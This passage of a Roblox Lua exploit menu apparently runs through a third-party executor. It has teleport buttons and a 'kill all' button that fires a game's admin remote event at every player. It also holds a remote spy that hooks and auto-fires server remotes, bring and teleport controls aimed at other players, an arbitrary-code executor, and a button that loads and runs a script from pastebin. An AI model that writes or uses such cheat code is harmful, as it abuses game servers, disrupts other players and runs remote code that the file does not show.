        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("UWU [PROMINENCE]", function()
   -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(5.1688408851623535, 4.1596574783325195, 223.21153259277344)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget() 
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CRAFT SYSTEM [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-813.8836059570312, -30.67633056640625, -668.554443359375)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(639.3765869140625, 4.062220573425293, 417.1491394042969)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-685.2726440429688, 7.258538246154785, -163.53884887695312)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("7 ELEVEN [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-71.01229858398438, 3.90071439743042, 561.624267578125)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-287.8799133300781, 19.498348236083984, 465.8647155761719)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["ADMIN PANEL"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(255,255,255),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.GothamSemibold,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(20,20,20)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255,255,255)}):Play()
	end)
	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("NOTE : ONLY WHITLISTED USER CAN USE THIS !", function()
	
end)

--// 8 Buttons in Main Menu
addMainMenuButton("ADMIN PANEL KICK ALL / SPAWN BTOOLS / TROLL / ADMIN GUN / SET SKY", function()
	local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

--// WHITELIST BY USERID (MAS SAFE)
local whitelist = {
    [8172987891] = true,  
    [6226066651] = true,
	[9925586155] = true,
	[6213315646] = true,  
    [8625608074] = true,
	[8708504286] = true,
	[2757397228] = true,
	[4602182711] = true,
	[5804682562] = true,
	[2577804945] = true,
	[7761002961] = true,
	[8970489737] = true,
	[8174283950] = true,
	[423338358] = true,
	[3575675921] = true,
	[7540853237] = true,
	[560604146] = true,
	[846984019] = true,
    [player.UserId] = true -- OPTIONAL: auto allow self
}

--// CHECK PANEL
local panel = player:WaitForChild("PlayerGui"):WaitForChild("ExtraUI"):WaitForChild("AdminPanel")
panel.Transparency = 0.1
panel.Visible = false -- default hidden

--// ONLY ALLOWED CAN USE
if not whitelist[player.UserId] then
    warn("ACCESS DENIED: You are not whitelisted.")
    return
end

--// KEYBIND (V)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.V then
        panel.Visible = not panel.Visible
    end
end)
end) 

--// 8 Buttons in Main Menu
addMainMenuButton("CLICK THIS TO SET THE SKY IF YOU HAVE BTOOLS IN YOUR INVENTORY", function()
	loadstring(game:HttpGet('https://pastebin.com/raw/KwTDPUgM', true))()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("KILL ALL ONLY WHITELISTED CAN USE THIS ! ", function()
	--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

--// WHITELIST BY USERID (MAS SAFE)
local whitelist = {
    [8172987891] = true,
    [6226066651] = true,
    [9925586155] = true,
    [6213315646] = true,
    [8625608074] = true,
    [8708504286] = true,
    [2757397228] = true,
    [4602182711] = true,
    [5804682562] = true,
    [2577804945] = true,
    [7761002961] = true,
    [8970489737] = true,
    [8174283950] = true,
    [846984019] = true,
	[3575675921] = true,
	[560604146] = true,
	[423338358] = true,
	[7540853237] = true,
    [player.UserId] = true  -- Auto-include ang sarili mo (safe)
}

--// CHECK IF WHITELISTED
if not whitelist[player.UserId] then
    warn("Access denied: User not whitelisted.")
    return -- Hihinto ang script kung hindi whitelisted
end

--// MAIN SCRIPT (SAFE NA TO RUN)
for _, targetPlayer in ipairs(Players:GetPlayers()) do
    local args = {
        targetPlayer.Name,
        "MONSY TO GAGO"
    }
    
    player
        :WaitForChild("PlayerGui")
        :WaitForChild("ExtraUI")
        :WaitForChild("AdminPanel")
        :WaitForChild("MainFrame")
        :WaitForChild("Frame")
        :WaitForChild("Event")
        :FireServer(unpack(args))
end
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["REMOTES"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(255,255,255),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.GothamSemibold,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(20,20,20)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255,255,255)}):Play()
	end)
	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("REMOTES ONLY FOR MONSY ! ", function()
	-- MONSY REMOTE SPY v3 - WITH USERNAME WHITELIST
-- Copy-paste this into your executor

-- // WHITELIST SETUP
local whitelist = {
    ["theyluvzmonsy"] = true,
    ["xwzxia"] = true,
	["GodSake01"] = true,
    ["Defntaudri"] = true,
	["woqq108"] = true,
    ["a4d878"] = true,
}

local Players = game:GetService("Players")
local player = Players.LocalPlayer

if not whitelist[player.Name] then
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "ACCESS DENIED";
        Text = "You are not whitelisted!";
        Duration = 5;
    })
    return -- stop script entirely
end

-- // CONTINUE ONLY IF WHITELISTED
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- GUI Setup
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "MonsyRemoteSpy"
gui.ResetOnSpawn = false

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 700, 0, 400)
main.Position = UDim2.new(0.5, -350, 0.5, -200)
main.BackgroundColor3 = Color3.fromRGB(255,255,255)
main.BorderSizePixel = 0
main.Parent = gui
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 15)

local titleBar = Instance.new("Frame", main)
titleBar.Size = UDim2.new(1, 0, 0, 35)
titleBar.BackgroundColor3 = Color3.fromRGB(255,255,255)
titleBar.BorderSizePixel = 0
Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 15)

local title = Instance.new("TextLabel", titleBar)
title.Size = UDim2.new(1, 0, 1, 0)
title.BackgroundTransparency = 1
title.Text = "MONSY REMOTE SPY"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 17

-- Left Panel
local leftPanel = Instance.new("Frame", main)
leftPanel.Size = UDim2.new(0, 200, 0, 330)
leftPanel.Position = UDim2.new(0, 15, 0, 50)
leftPanel.BackgroundColor3 = Color3.fromRGB(255,255,255)
Instance.new("UICorner", leftPanel).CornerRadius = UDim.new(0, 10)

local leftScroll = Instance.new("ScrollingFrame", leftPanel)
leftScroll.Size = UDim2.new(1, -10, 1, -10)
leftScroll.Position = UDim2.new(0, 5, 0, 5)
leftScroll.BackgroundTransparency = 1
leftScroll.ScrollBarThickness = 4
leftScroll.CanvasSize = UDim2.new(0, 0, 0, 0)

local leftLayout = Instance.new("UIListLayout", leftScroll)
leftLayout.Padding = UDim.new(0, 3)
leftLayout.SortOrder = Enum.SortOrder.LayoutOrder

-- Right Panel
local rightPanel = Instance.new("Frame", main)
rightPanel.Size = UDim2.new(0, 450, 0, 330)
rightPanel.Position = UDim2.new(0, 235, 0, 50)
rightPanel.BackgroundColor3 = Color3.fromRGB(255,255,255)
Instance.new("UICorner", rightPanel).CornerRadius = UDim.new(0, 10)

local logScroll = Instance.new("ScrollingFrame", rightPanel)
logScroll.Size = UDim2.new(1, -10, 1, -50)
logScroll.Position = UDim2.new(0, 5, 0, 5)
logScroll.BackgroundTransparency = 1
logScroll.ScrollBarThickness = 4
logScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y

local logLayout = Instance.new("UIListLayout", logScroll)
logLayout.Padding = UDim.new(0, 4)
logLayout.SortOrder = Enum.SortOrder.LayoutOrder

-- Buttons
local btnContainer = Instance.new("Frame", rightPanel)
btnContainer.Size = UDim2.new(1, -10, 0, 35)
btnContainer.Position = UDim2.new(0.5, -175, 1, -40)
btnContainer.BackgroundTransparency = 1

local function makeBtn(text, x)
    local btn = Instance.new("TextButton", btnContainer)
    btn.Size = UDim2.new(0, 80, 1, 0)
    btn.Position = UDim2.new(0, x, 0, 0)
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    return btn
end

local fireBtn = makeBtn("FIRE", 0)
local startBtn = makeBtn("START", 90)
local clearBtn = makeBtn("CLEAR", 180)
local copyBtn = makeBtn("COPY", 270)

-- Variables
local selectedRemote = nil
local autoFiring = false
local conn = nil
local buttonMap = {}
local insertionQueue = insertionQueue or {}

local function tostr(v)
    if typeof(v) == "Instance" then
        return "game." .. v:GetFullName()
    elseif typeof(v) == "string" then
        return '"' .. v:gsub('"', '\\"') .. '"'
    else
        return tostring(v)
    end
end

-- Get Remotes
local function getRemotes()
    local remotes = {}
    local function scan(parent)
        for _, obj in pairs(parent:GetChildren()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                table.insert(remotes, obj)
            end
            scan(obj)
        end
    end
    for _, v in pairs({game.ReplicatedStorage, game.Workspace, game.StarterGui, game.StarterPack, game.StarterPlayer.StarterPlayerScripts}) do
        if v then scan(v) end
    end
    return remotes
end

-- Create Button
local function createButton(remote)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -10, 0, 25)
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.Text = remote.Name
    btn.TextColor3 = Color3.fromRGB(0,0,0)
    btn.Font = Enum.Font.Code
    btn.TextSize = 14
    btn.Parent = leftScroll
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

    buttonMap[remote] = btn

    btn.MouseButton1Click:Connect(function()
        for _, b in pairs(leftScroll:GetChildren()) do
            if b:IsA("TextButton") then b.BackgroundColor3 = Color3.fromRGB(255,255,255) end
        end
        btn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
        selectedRemote = remote
    end)
end

-- Add Log
local function addLog(text)
    for line in text:gmatch("[^\n]+") do
        local label = Instance.new("TextLabel", logScroll)
        label.Size = UDim2.new(1, -10, 0, 18)
        label.BackgroundTransparency = 1
        label.Text = line
        label.TextColor3 = Color3.fromRGB(0,0,0)
        label.Font = Enum.Font.Code
        label.TextSize = 13
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.TextWrapped = true
    end
    task.delay(0.01, function()
        logScroll.CanvasPosition = Vector2.new(0, logScroll.AbsoluteCanvasSize.Y)
    end)
end

-- Auto Insert
local function autoInsertToQueue(remote, argsTable)
    local log = "Remote Fired: " .. remote:GetFullName()
    local argsStr = "{"
    for i, arg in ipairs(argsTable) do
        argsStr = argsStr .. (i > 1 and ", " or "") .. tostr(arg)
    end
    argsStr = argsStr .. "}"

    local scriptLine = "local args = " .. argsStr .. "\n\n" .. tostr(remote) .. ":FireServer(unpack(args))"

    table.insert(insertionQueue, { log, "To", scriptLine, nil, remote, argsTable, "FireServer" })

    local btn = buttonMap[remote]
    if btn and btn.Parent then
        for _, b in pairs(leftScroll:GetChildren()) do
            if b:IsA("TextButton") then
                b.BackgroundColor3 = Color3.fromRGB(255,255,255)
            end
        end
        btn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
        selectedRemote = remote
    end

    addLog(log)
    addLog(scriptLine)
    addLog("")
end

-- Hook Remotes
local oldFire = {}
local function hookRemote(remote)
    if remote:IsA("RemoteEvent") then
        oldFire[remote] = remote.FireServer
        remote.FireServer = function(self, ...)
            local args = {...}
            task.spawn(autoInsertToQueue, remote, args)
            return oldFire[remote](self, ...)
        end
    elseif remote:IsA("RemoteFunction") then
        oldFire[remote] = remote.InvokeServer
        remote.InvokeServer = function(self, ...)
            local args = {...}
            task.spawn(autoInsertToQueue, remote, args)
            return oldFire[remote](self, ...)
        end
    end
end

-- Initialize
local remotes = getRemotes()
for _, r in pairs(remotes) do
    createButton(r)
    pcall(hookRemote, r)
end
leftScroll.CanvasSize = UDim2.new(0, 0, 0, #remotes * 28)

-- Buttons
fireBtn.MouseButton1Click:Connect(function()
    if not selectedRemote then return addLog("Select remote first!") end
    autoInsertToQueue(selectedRemote, {})
    pcall(function()
        if selectedRemote:IsA("RemoteEvent") then
            selectedRemote:FireServer()
        else
            selectedRemote:InvokeServer()
        end
    end)
end)

startBtn.MouseButton1Click:Connect(function()
    if not selectedRemote then return addLog("Select remote first!") end
    autoFiring = not autoFiring
    startBtn.Text = autoFiring and "RUNNING" or "START"
    addLog(autoFiring and "Auto firing started." or "Stopped auto firing.")
    if conn then conn:Disconnect() end
    if autoFiring then
        conn = RunService.Heartbeat:Connect(function()
            pcall(function()
                if selectedRemote:IsA("RemoteEvent") then
                    selectedRemote:FireServer()
                else
                    selectedRemote:InvokeServer()
                end
            end)
        end)
    end
end)

clearBtn.MouseButton1Click:Connect(function()
    for _, v in pairs(logScroll:GetChildren()) do
        if v:IsA("TextLabel") then v:Destroy() end
    end
    addLog("Logs cleared.")
end)

copyBtn.MouseButton1Click:Connect(function()
    if not selectedRemote then return addLog("Select remote first!") end
    local scriptLine = "local args = {}\n\n" .. tostr(selectedRemote) .. ":FireServer(unpack(args))"
    if setclipboard then
        setclipboard(scriptLine)
        addLog("Copied to clipboard.")
    else
        addLog("Clipboard not supported.")
    end
    addLog(scriptLine)
end)

-- Dragging
local dragging, dragStart, startPos = false, nil, nil
titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

addLog("✅ MONSY REMOTE SPY LOADED (WHITELIST MODE)")
addLog("Welcome, " .. player.Name .. "!")
addLog("")
end)

----------------------------------------------------------------
-- PLAYER LIST – LIGHT GRAY MINI BUTTONS
----------------------------------------------------------------
local playerListPanel = allTabPanels["PLAYER LIST"]

local function refreshPlayers()
	for _, child in ipairs(playerListPanel:GetChildren()) do
		if child:IsA("Frame") then child:Destroy() end
	end

	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= player then
			local row = new("Frame", {
				Parent = playerListPanel,
				Size = UDim2.new(1, -16, 0, 40),
				BackgroundColor3 = Color3.fromRGB(255,255,255),
				BorderSizePixel = 0,
			})
			new("UICorner", {CornerRadius = UDim.new(0,6), Parent = row})

			local nameLabel = new("TextLabel", {
				Parent = row,
				Size = UDim2.new(0.6, 0, 1, 0),
				Position = UDim2.new(0, 8, 0, 0),
				BackgroundTransparency = 1,
				Text = plr.DisplayName .. " (@" .. plr.Name .. ")",
				TextColor3 = Color3.new(0,0,0),
				Font = Enum.Font.Gotham,
				TextSize = 14,
				TextXAlignment = Enum.TextXAlignment.Left,
			})

			local buttonContainer = new("Frame", {
				Parent = row,
				Size = UDim2.new(0.4, 0, 1, 0),
				Position = UDim2.new(0.6, 0, 0, 0),
				BackgroundTransparency = 1,
			})
			new("UIListLayout", {
				Parent = buttonContainer,
				FillDirection = Enum.FillDirection.Horizontal,
				Padding = UDim.new(0, 4),
				HorizontalAlignment = Enum.HorizontalAlignment.Right,
			})

			local function makeMiniBtn(text, callback)
				local b = new("TextButton", {
					Parent = buttonContainer,
					Size = UDim2.new(0, 60, 0, 28),
					BackgroundColor3 = Color3.fromRGB(230,230,230), -- light gray button
					Text = text,
					TextColor3 = Color3.new(0,0,0),
					Font = Enum.Font.GothamSemibold,
					TextSize = 10,
				})
				new("UICorner", {CornerRadius = UDim.new(0,4), Parent = b})
				b.MouseButton1Click:Connect(function()
					if callback then callback(plr) end
				end)
			end

			makeMiniBtn("VIEW", function(p) 
				if p.Character and p.Character:FindFirstChildOfClass("Humanoid") then
					pcall(function() workspace.CurrentCamera.CameraSubject = p.Character end)
				end
			end)
			makeMiniBtn("UNVIEW", function() 
				pcall(function() workspace.CurrentCamera.CameraSubject = player.Character end)
			end)
			makeMiniBtn("BRING", function(p)
				if p.Character and p.Character:FindFirstChild("HumanoidRootPart") and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
					p.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
				end
			end)
			makeMiniBtn("UNBRING", function() end)
			makeMiniBtn("TP", function(p)
				if p.Character and p.Character:FindFirstChild("HumanoidRootPart") and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
					player.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame
				end
			end)
		end
	end
end

refreshPlayers()
Players.PlayerAdded:Connect(refreshPlayers)
Players.PlayerRemoving:Connect(refreshPlayers)

----------------------------------------------------------------
-- SETTINGS – WORKING
----------------------------------------------------------------
local settingsPanel = allTabPanels["SETTINGS"]
local fill

-- Transparency
local transLabel = new("TextLabel", {
	Parent = settingsPanel,
	Size = UDim2.new(1, 0, 0, 30),
	Text = "GUI Transparency: 0%",
	BackgroundTransparency = 1,
	TextColor3 = Color3.new(0,0,0),
})

local slider = new("Frame", {
	Parent = settingsPanel,
	Size = UDim2.new(1, 0, 0, 20),
	BackgroundColor3 = Color3.fromRGB(245,245,245),
})
fill = new("Frame", {
	Parent = slider,
	Size = UDim2.new(0.5, 0, 1, 0),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
})
new("UICorner", {CornerRadius = UDim.new(0,10), Parent = slider})
new("UICorner", {CornerRadius = UDim.new(0,10), Parent = fill})

local draggingSlider = false
slider.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then draggingSlider = true end end)
UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then draggingSlider = false end end)
UserInputService.InputChanged:Connect(function(i)
	if draggingSlider and i.UserInputType == Enum.UserInputType.MouseMovement then
		local p = math.clamp((i.Position.X - slider.AbsolutePosition.X) / slider.AbsoluteSize.X, 0, 1)
		fill.Size = UDim2.new(p, 0, 1, 0)
		main.BackgroundTransparency = p * 0.7
		transLabel.Text = "GUI Transparency: " .. math.floor(p * 100) .. "%"
	end
end)

-- Keybind
local keybindLabel = new("TextLabel", {
	Parent = settingsPanel,
	Size = UDim2.new(1, 0, 0, 30),
	Text = "Toggle Key: RightControl",
	BackgroundTransparency = 1,
	TextColor3 = Color3.new(0,0,0),
})
local toggleKey = Enum.KeyCode.RightControl
local listening = false
local keybindBtn = new("TextButton", {
	Parent = settingsPanel,
	Size = UDim2.new(1, 0, 0, 40),
	BackgroundColor3 = Color3.fromRGB(245,245,245),
	Text = "Change Toggle Key",
	TextColor3 = Color3.new(0,0,0),
})
new("UICorner", {CornerRadius = UDim.new(0,6), Parent = keybindBtn})
keybindBtn.MouseButton1Click:Connect(function()
	listening = true
	keybindBtn.Text = "Press any key..."
end)
UserInputService.InputBegan:Connect(function(i)
	if listening and i.KeyCode ~= Enum.KeyCode.Unknown then
		toggleKey = i.KeyCode
		keybindLabel.Text = "Toggle Key: " .. i.KeyCode.Name
		keybindBtn.Text = "Change Toggle Key"
		listening = false
	end
end)

-- Theme
local themeLabel = new("TextLabel", {
	Parent = settingsPanel,
	Size = UDim2.new(1, 0, 0, 30),
	Text = "Theme: WHITE",
	BackgroundTransparency = 1,
	TextColor3 = Color3.new(0,0,0),
})
for name, _ in pairs(themes) do
	local btn = new("TextButton", {
		Parent = settingsPanel,
		Size = UDim2.new(1, 0, 0, 36),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		Text = name,
		TextColor3 = Color3.new(0,0,0),
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})
	btn.MouseButton1Click:Connect(function()
		currentTheme = name
		themeLabel.Text = "Theme: " .. name
		applyTheme()
	end)
end

----------------------------------------------------------------
-- LUA EXECUTOR – LIGHT THEME TEXTBOX
----------------------------------------------------------------
local executorPanel = allTabPanels["LUA EXECUTOR"]

local execBtn = new("TextButton", {
	Parent = executorPanel,
	Size = UDim2.new(1, 0, 0, 40),
	Position = UDim2.new(0, 0, 0, 0),
	BackgroundColor3 = Color3.fromRGB(200,200,200),
	Text = "EXECUTE",
	TextColor3 = Color3.new(0,0,0),
	Font = Enum.Font.GothamBold,
	TextSize = 16,
})
new("UICorner", {CornerRadius = UDim.new(0,6), Parent = execBtn})

local codeBox = new("TextBox", {
	Parent = executorPanel,
	Size = UDim2.new(1, 0, 1, -50),
	Position = UDim2.new(0, 0, 0, 50),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	Text = "-- Enter Lua script here\nprint('MONSY Executor Ready!')",
	MultiLine = true,
	TextColor3 = Color3.new(0,0,0),
	Font = Enum.Font.Code,
	TextSize = 14,
	ClearTextOnFocus = false,
})
new("UICorner", {CornerRadius = UDim.new(0,6), Parent = codeBox})

execBtn.MouseButton1Click:Connect(function()
	local success, err = pcall(function()
		loadstring(codeBox.Text)()
	end)
	if not success then warn("Executor Error: " .. err) end
end)

----------------------------------------------------------------
-- DRAGGABLE + TOGGLE
----------------------------------------------------------------
do
	local draggingFrame, dragInput, dragStart, startPos
	local function update(i)
		local d = i.Position - dragStart
		main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
	end
	main.InputBegan:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseButton1 then
			draggingFrame = true; dragStart = i.Position; startPos = main.Position
			i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then draggingFrame = false end end)
		end
	end)
	main.InputChanged:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseMovement then dragInput = i end
	end)
	UserInputService.InputChanged:Connect(function(i)
		if i == dragInput and draggingFrame then update(i) end
	end)
end

UserInputService.InputBegan:Connect(function(i, gp)
	if gp then return end
	if i.KeyCode == toggleKey then
		screenGui.Enabled = not screenGui.Enabled
		if screenGui.Enabled then
			showTab("MAIN MENU")
			for _, b in ipairs(allTabButtons) do b.BackgroundColor3 = Color3.fromRGB(245,245,245) end
			if allTabButtons[1] then allTabButtons[1].BackgroundColor3 = Color3.fromRGB(200,200,200) end
		end
	end
end)

-- Apply initial theme (ensures text colors are correct)
applyTheme()



